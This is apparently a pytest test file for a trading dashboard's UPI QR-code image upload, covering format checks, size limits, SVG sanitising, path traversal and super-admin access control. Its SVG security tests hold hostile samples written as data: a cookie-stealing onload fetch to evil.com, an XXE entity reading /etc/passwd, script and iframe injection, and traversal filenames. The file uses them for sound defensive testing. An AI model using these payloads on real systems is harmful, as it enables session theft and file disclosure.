"""Tests for Super Admin UPI Scanner Upload & Customization Engine.

Verifies:
- File signature / magic bytes validation (PNG, JPEG, WebP, SVG)
- 2 MB file size limit enforcement
- Image decode & dimension / decompression bomb safety
- Strict SVG security (rejecting script, onload, XXE, foreignObject, external links)
- Extension / MIME consistency and path traversal prevention
- Atomic disk persistence across rebuilds
- Authoritative config store precedence and restart persistence
- Dynamic NPCI QR generation fallback
- Public image serving endpoint (/api/billing/upi-qr-image)
- Super Admin RBAC enforcement (only super_admin can configure/upload/delete)
- Privileged audit trail generation
"""

import base64
import io
import json
import os
import tempfile
from pathlib import Path
from unittest.mock import patch, MagicMock

import pytest
from fastapi import FastAPI
from fastapi.testclient import TestClient
from PIL import Image

from core.billing.upi_billing_engine import UpiBillingEngine


def make_valid_png(size=(64, 64), color="white") -> bytes:
    bio = io.BytesIO()
    img = Image.new("RGB", size, color=color)
    img.save(bio, format="PNG")
    return bio.getvalue()


def make_valid_jpeg(size=(64, 64), color="white") -> bytes:
    bio = io.BytesIO()
    img = Image.new("RGB", size, color=color)
    img.save(bio, format="JPEG")
    return bio.getvalue()


def make_valid_webp(size=(64, 64), color="white") -> bytes:
    bio = io.BytesIO()
    img = Image.new("RGB", size, color=color)
    img.save(bio, format="WEBP")
    return bio.getvalue()


@pytest.fixture
def clean_qr_storage(tmp_path):
    """Isolate QR storage directory for test execution."""
    with patch.object(UpiBillingEngine, "_resolve_storage_dir", return_value=tmp_path):
        with patch.dict(os.environ, {"OPBUYING_UPI_QR_PATH": ""}):
            yield tmp_path


def test_default_upi_details():
    """Verify default VPA and Payee Name are resolved cleanly."""
    with patch.object(UpiBillingEngine, "get_config_path", return_value=Path("/nonexistent/config.json")):
        with patch.dict(os.environ, {}, clear=False):
            os.environ.pop("OPBUYING_UPI_VPA", None)
            os.environ.pop("OPBUYING_UPI_PAYEE_NAME", None)
            assert "@" in UpiBillingEngine.get_upi_vpa()
            assert len(UpiBillingEngine.get_payee_name()) > 0


def test_env_override_upi_details():
    """Verify environment variables provide fallback if config.json does not define keys."""
    with patch.object(UpiBillingEngine, "get_config_path", return_value=Path("/nonexistent/config.json")):
        with patch.dict(os.environ, {
            "OPBUYING_UPI_VPA": "custom.merchant@hdfcbank",
            "OPBUYING_UPI_PAYEE_NAME": "Custom Trading Desk",
        }):
            assert UpiBillingEngine.get_upi_vpa() == "custom.merchant@hdfcbank"
            assert UpiBillingEngine.get_payee_name() == "Custom Trading Desk"


def test_authoritative_config_store_precedence_and_restart(tmp_path):
    """Verify config.json is the sole authoritative store, overriding env and surviving restarts."""
    test_cfg = tmp_path / "config.json"
    with patch.object(UpiBillingEngine, "get_config_path", return_value=test_cfg):
        # 1. WRITE: Super Admin saves new VPA & Payee Name
        ok, msg = UpiBillingEngine.set_upi_config(
            upi_vpa="admin.authoritative@icici",
            payee_name="Authoritative Master Desk",
        )
        assert ok is True
        assert test_cfg.exists()

        # 2. READ: Even with competing env vars, config.json PREVAILS
        with patch.dict(os.environ, {
            "OPBUYING_UPI_VPA": "competing.env@axisbank",
            "OPBUYING_UPI_PAYEE_NAME": "Competing Env Desk",
        }):
            assert UpiBillingEngine.get_upi_vpa() == "admin.authoritative@icici"
            assert UpiBillingEngine.get_payee_name() == "Authoritative Master Desk"

        # 3. RESTART: Simulate process restart by reloading directly from config.json
        with open(test_cfg, "r", encoding="utf-8") as f:
            disk_data = json.load(f)
        assert disk_data["UPI_VPA"] == "admin.authoritative@icici"
        assert disk_data["UPI_PAYEE_NAME"] == "Authoritative Master Desk"
        assert UpiBillingEngine.get_upi_vpa() == "admin.authoritative@icici"


def test_save_valid_png_qr(clean_qr_storage):
    """Verify saving a valid PNG file persists atomically and sets has_custom_qr."""
    png_bytes = make_valid_png()
    ok, msg = UpiBillingEngine.save_custom_qr_image(png_bytes, "scanner.png")
    assert ok is True
    assert "saved successfully" in msg
    assert UpiBillingEngine.has_custom_qr() is True

    custom_path = UpiBillingEngine.get_custom_qr_path()
    assert custom_path is not None
    assert custom_path.exists()
    assert custom_path.suffix == ".png"
    assert custom_path.read_bytes() == png_bytes


def test_save_valid_jpeg_qr(clean_qr_storage):
    """Verify JPEG magic bytes and Pillow decode are recognized and stored."""
    jpeg_bytes = make_valid_jpeg()
    ok, msg = UpiBillingEngine.save_custom_qr_image(jpeg_bytes, "scanner.jpg")
    assert ok is True
    assert UpiBillingEngine.has_custom_qr() is True
    assert UpiBillingEngine.get_custom_qr_path().suffix == ".jpg"


def test_save_valid_webp_qr(clean_qr_storage):
    """Verify WebP files are supported and decoded."""
    webp_bytes = make_valid_webp()
    ok, msg = UpiBillingEngine.save_custom_qr_image(webp_bytes, "scanner.webp")
    assert ok is True
    assert UpiBillingEngine.has_custom_qr() is True
    assert UpiBillingEngine.get_custom_qr_path().suffix == ".webp"


def test_save_valid_svg_qr(clean_qr_storage):
    """Verify clean SVG vector format is accepted and sanitized."""
    svg_bytes = b"<svg xmlns='http://www.w3.org/2000/svg' width='100' height='100'><rect width='100' height='100' fill='black'/></svg>"
    ok, msg = UpiBillingEngine.save_custom_qr_image(svg_bytes, "scanner.svg")
    assert ok is True
    assert UpiBillingEngine.has_custom_qr() is True
    assert UpiBillingEngine.get_custom_qr_path().suffix == ".svg"


def test_reject_oversized_image(clean_qr_storage):
    """Verify files larger than 2 MB are rejected."""
    oversized = b"\x89PNG\r\n\x1a\n" + (b"X" * (2 * 1024 * 1024 + 100))
    ok, msg = UpiBillingEngine.save_custom_qr_image(oversized, "scanner.png")
    assert ok is False
    assert "exceeds 2 MB limit" in msg
    assert UpiBillingEngine.has_custom_qr() is False


def test_reject_invalid_executable_format(clean_qr_storage):
    """Verify executables and arbitrary text are rejected."""
    fake_exe = b"MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00"
    ok, msg = UpiBillingEngine.save_custom_qr_image(fake_exe, "malware.exe")
    assert ok is False
    assert "Unsupported image format" in msg

    text_bytes = b"This is plain text and not a UPI scanner."
    ok2, msg2 = UpiBillingEngine.save_custom_qr_image(text_bytes, "file.txt")
    assert ok2 is False
    assert "Unsupported image format" in msg2


# ============================================================
# Section 10: Strict SVG Security Tests
# ============================================================

def test_svg_security_rejects_script(clean_qr_storage):
    """Reject SVG containing embedded <script> tags."""
    evil_svg = b"<svg xmlns='http://www.w3.org/2000/svg'><script>alert(document.cookie)</script></svg>"
    ok, msg = UpiBillingEngine.save_custom_qr_image(evil_svg, "scanner.svg")
    assert ok is False
    assert "Dangerous SVG pattern detected" in msg or "rejected" in msg


def test_svg_security_rejects_onload(clean_qr_storage):
    """Reject SVG containing inline JavaScript event handlers (onload, onclick)."""
    evil_svg = b"<svg xmlns='http://www.w3.org/2000/svg' onload='fetch(\"http://evil.com/\"+document.cookie)'><rect width='10' height='10'/></svg>"
    ok, msg = UpiBillingEngine.save_custom_qr_image(evil_svg, "scanner.svg")
    assert ok is False
    assert "event handler" in msg.lower() or "rejected" in msg.lower()


def test_svg_security_rejects_doctype_and_entity(clean_qr_storage):
    """Reject SVG containing dangerous XML DOCTYPE or ENTITY definitions (XXE attacks)."""
    evil_svg = b"<!DOCTYPE svg [ <!ENTITY xxe SYSTEM 'file:///etc/passwd'> ]><svg xmlns='http://www.w3.org/2000/svg'>&xxe;</svg>"
    ok, msg = UpiBillingEngine.save_custom_qr_image(evil_svg, "scanner.svg")
    assert ok is False
    assert "Dangerous SVG pattern detected" in msg or "rejected" in msg


def test_svg_security_rejects_foreign_object(clean_qr_storage):
    """Reject SVG containing <foreignObject> embedded HTML."""
    evil_svg = b"<svg xmlns='http://www.w3.org/2000/svg'><foreignObject width='100' height='50'><body><iframe src='http://evil.com'></iframe></body></foreignObject></svg>"
    ok, msg = UpiBillingEngine.save_custom_qr_image(evil_svg, "scanner.svg")
    assert ok is False
    assert "foreignobject" in msg.lower() or "rejected" in msg.lower()


def test_svg_security_rejects_external_references(clean_qr_storage):
    """Reject SVG pointing to external URLs or javascript schemes in href."""
    evil_svg = b"<svg xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink'><a href='javascript:steal()'><rect width='10' height='10'/></a></svg>"
    ok, msg = UpiBillingEngine.save_custom_qr_image(evil_svg, "scanner.svg")
    assert ok is False
    assert "dangerous" in msg.lower() or "rejected" in msg.lower() or "unsafe" in msg.lower()


def test_svg_security_rejects_css_import(clean_qr_storage):
    """Reject SVG with dangerous CSS @import or external expressions."""
    evil_svg = b"<svg xmlns='http://www.w3.org/2000/svg'><style>@import url('http://evil.com/styles.css');</style></svg>"
    ok, msg = UpiBillingEngine.save_custom_qr_image(evil_svg, "scanner.svg")
    assert ok is False
    assert "Dangerous CSS construct" in msg or "rejected" in msg


# ============================================================
# Section 11: Image Validation Tests (MIME, Bounds, Traversal)
# ============================================================

def test_image_rejects_extension_mismatch(clean_qr_storage):
    """Reject image where filename extension contradicts magic bytes and actual encoding."""
    png_bytes = make_valid_png()
    # Attempting to upload PNG content as .jpg
    ok, msg = UpiBillingEngine.save_custom_qr_image(png_bytes, "scanner.jpg")
    assert ok is False
    assert "Content-type mismatch" in msg


def test_image_rejects_path_traversal(clean_qr_storage):
    """Reject filenames attempting directory traversal or absolute path injection."""
    png_bytes = make_valid_png()
    for bad_name in ("../../etc/passwd.png", "..\\windows\\system32\\evil.png", "/tmp/scanner.png", "C:\\scanner.png"):
        ok, msg = UpiBillingEngine.save_custom_qr_image(png_bytes, bad_name)
        assert ok is False
        assert "path traversal" in msg.lower() or "unsafe characters" in msg.lower()


def test_image_rejects_oversized_dimensions(clean_qr_storage):
    """Reject images exceeding 4096x4096px bounds."""
    huge_png = make_valid_png(size=(5000, 100))
    ok, msg = UpiBillingEngine.save_custom_qr_image(huge_png, "scanner.png")
    assert ok is False
    assert "exceed" in msg and "4096" in msg


def test_delete_custom_qr(clean_qr_storage):
    """Verify deletion removes file and restores dynamic QR state."""
    png_bytes = make_valid_png()
    UpiBillingEngine.save_custom_qr_image(png_bytes, "scanner.png")
    assert UpiBillingEngine.has_custom_qr() is True

    removed = UpiBillingEngine.delete_custom_qr_image()
    assert removed is True
    assert UpiBillingEngine.has_custom_qr() is False
    assert UpiBillingEngine.get_custom_qr_path() is None


def test_generate_upi_qr_string_includes_custom_state(clean_qr_storage):
    """Verify generate_upi_qr_string payload reflects custom scanner status."""
    # Before upload
    data = UpiBillingEngine.generate_upi_qr_string("plan_options_vip", "test_user")
    assert data["has_custom_qr"] is False
    assert data["custom_qr_url"] is None
    assert "upi://" in data["upi_uri"]

    # After upload
    png_bytes = make_valid_png()
    UpiBillingEngine.save_custom_qr_image(png_bytes, "scanner.png")

    data_custom = UpiBillingEngine.generate_upi_qr_string("plan_options_vip", "test_user")
    assert data_custom["has_custom_qr"] is True
    assert data_custom["custom_qr_url"] == "/api/billing/upi-qr-image"


@pytest.fixture
def mock_dashboard_app(clean_qr_storage):
    """Create lightweight test client with dashboard routes mounted."""
    from fastapi import FastAPI, Depends, Request
    from fastapi.responses import JSONResponse
    from core.enterprise_dashboard.routes.admin import register_admin_routes

    app = FastAPI()

    class MockUser:
        def __init__(self, username: str, role: str):
            self.username = username
            self.role = role

    class MockAuthDeps:
        def require_auth(self, request: Request):
            role = request.headers.get("x-mock-role", "viewer")
            username = request.headers.get("x-mock-user", "test_user")
            return MockUser(username, role)

        def require_permission(self, perm: str):
            def dep(request: Request):
                role = request.headers.get("x-mock-role", "viewer")
                username = request.headers.get("x-mock-user", "test_user")
                return MockUser(username, role)
            return dep

        def require_role(self, required_role: str):
            def dep(request: Request):
                role = request.headers.get("x-mock-role", "viewer")
                username = request.headers.get("x-mock-user", "test_user")
                if required_role == "super_admin" and role != "super_admin":
                    from fastapi import HTTPException
                    raise HTTPException(status_code=403, detail="Forbidden")
                return MockUser(username, role)
            return dep

    class MockDashboard:
        def __init__(self):
            self._auth_deps = MockAuthDeps()
            self._cfg = {}
            self._auth = MagicMock()

        def _resolve_config_path(self):
            return Path(tempfile.gettempdir()) / "mock_config.json"

    mock_dash = MockDashboard()
    admin_only = mock_dash._auth_deps.require_role("super_admin")
    operator_or_admin = mock_dash._auth_deps.require_role("operator")
    register_admin_routes(app, mock_dash, admin_only, operator_or_admin)

    # Also register public QR image route
    from fastapi.responses import FileResponse
    @app.get("/api/billing/upi-qr-image")
    async def get_upi_qr_image():
        custom_path = UpiBillingEngine.get_custom_qr_path()
        if not custom_path or not custom_path.exists():
            return JSONResponse(status_code=404, content={"error": "Custom QR image not found"})
        ext = custom_path.suffix.lower()
        mime_map = {
            ".png": "image/png",
            ".jpg": "image/jpeg",
            ".jpeg": "image/jpeg",
            ".webp": "image/webp",
            ".svg": "image/svg+xml",
        }
        media_type = mime_map.get(ext, "image/png")
        return FileResponse(path=str(custom_path), media_type=media_type, headers={"Cache-Control": "no-cache, must-revalidate"})

    admin_client = TestClient(app, headers={"x-mock-role": "super_admin", "x-mock-user": "admin_boss"})
    viewer_client = TestClient(app, headers={"x-mock-role": "viewer", "x-mock-user": "normal_viewer"})
    client = TestClient(app)

    return {
        "admin_client": admin_client,
        "viewer_client": viewer_client,
        "client": client,
    }


def test_public_upi_qr_image_endpoint(mock_dashboard_app, clean_qr_storage):
    """Verify /api/billing/upi-qr-image serves image when present and 404 when absent."""
    client = mock_dashboard_app["client"]

    # 1. Initially 404
    res = client.get("/api/billing/upi-qr-image")
    assert res.status_code == 404

    # 2. Upload valid PNG
    png_bytes = make_valid_png()
    UpiBillingEngine.save_custom_qr_image(png_bytes, "scanner.png")

    # 3. Now 200 with media type image/png
    res2 = client.get("/api/billing/upi-qr-image")
    assert res2.status_code == 200
    assert res2.headers["content-type"] == "image/png"
    assert "no-cache" in res2.headers["cache-control"]


def test_super_admin_upload_and_delete_endpoints(mock_dashboard_app, clean_qr_storage):
    """Verify Super Admin can upload, update config, and delete scanner."""
    admin = mock_dashboard_app["admin_client"]

    # 1. Update UPI VPA
    res_cfg = admin.post("/api/admin/billing/upi-config", json={
        "upi_vpa": "superadmin@axisbank",
        "payee_name": "Super Admin Trading Co",
    })
    assert res_cfg.status_code == 200
    assert res_cfg.json()["details"]["upi_vpa"] == "superadmin@axisbank"

    # 2. Upload via base64
    png_bytes = make_valid_png()
    b64_str = base64.b64encode(png_bytes).decode("ascii")

    res_upload = admin.post("/api/admin/billing/upload-qr", json={
        "image_base64": b64_str,
        "filename": "my_scanner.png",
    })
    assert res_upload.status_code == 200
    assert res_upload.json()["success"] is True
    assert res_upload.json()["details"]["has_custom_qr"] is True

    # 3. Delete scanner
    res_del = admin.post("/api/admin/billing/delete-qr")
    assert res_del.status_code == 200
    assert res_del.json()["details"]["has_custom_qr"] is False


def test_viewer_cannot_upload_or_mutate_upi(mock_dashboard_app):
    """Verify non-super-admin receives 403 Forbidden on management endpoints."""
    viewer = mock_dashboard_app["viewer_client"]

    # Cannot update config
    res1 = viewer.post("/api/admin/billing/upi-config", json={"upi_vpa": "hacker@upi"})
    assert res1.status_code == 403

    # Cannot upload
    res2 = viewer.post("/api/admin/billing/upload-qr", json={"image_base64": "AAA"})
    assert res2.status_code == 403

    # Cannot delete
    res3 = viewer.post("/api/admin/billing/delete-qr")
    assert res3.status_code == 403


def test_pricing_plans_template_upi_contracts():
    """Verify pricing_plans.html UI contracts for Super Admin UPI engine."""
    from pathlib import Path
    template_path = Path(__file__).resolve().parents[1] / "templates" / "enterprise" / "pricing_plans.html"
    assert template_path.exists()
    content = template_path.read_text(encoding="utf-8")

    # Super Admin controls
    assert "is_super_admin" in content
    assert "btnOpenSuperAdminModal" in content
    assert "superAdminModal" in content
    assert "adminUpiVpaInput" in content
    assert "adminPayeeNameInput" in content
    assert "btnSaveUpiConfig" in content
    assert "btnUploadScanner" in content
    assert "btnDeleteScanner" in content

    # Subscriber checkout enhancements
    assert "btnCopyVpa" in content
    assert "btnMobileUpi" in content
    assert "txnRefInput" in content
    assert "modalMerchantBadge" in content

    # Factual wording check (Section 12 requirement: no unsupported "Official Merchant Scanner")
    assert "Official Merchant Scanner" not in content
    assert "Configured Merchant QR" in content

    # Strict CSP rule: no inline onclick handlers
    assert 'onclick=' not in content.lower()


def test_admin_config_template_upi_contracts():
    """Verify admin_config.html UI contracts for UPI & Billing tab."""
    from pathlib import Path
    template_path = Path(__file__).resolve().parents[1] / "templates" / "enterprise" / "admin_config.html"
    assert template_path.exists()
    content = template_path.read_text(encoding="utf-8")

    # Billing tab & section
    assert 'data-tab="billing"' in content
    assert 'id="section-billing"' in content
    assert 'id="adminUpiVpaField"' in content
    assert 'id="adminPayeeNameField"' in content
    assert 'id="saveUpiConfigBtn"' in content
    assert 'id="adminConfigQrPreviewImg"' in content
    assert 'id="adminConfigUploadQrBtn"' in content
    assert 'id="adminConfigDeleteQrBtn"' in content
    assert "loadAdminBillingConfig" in content
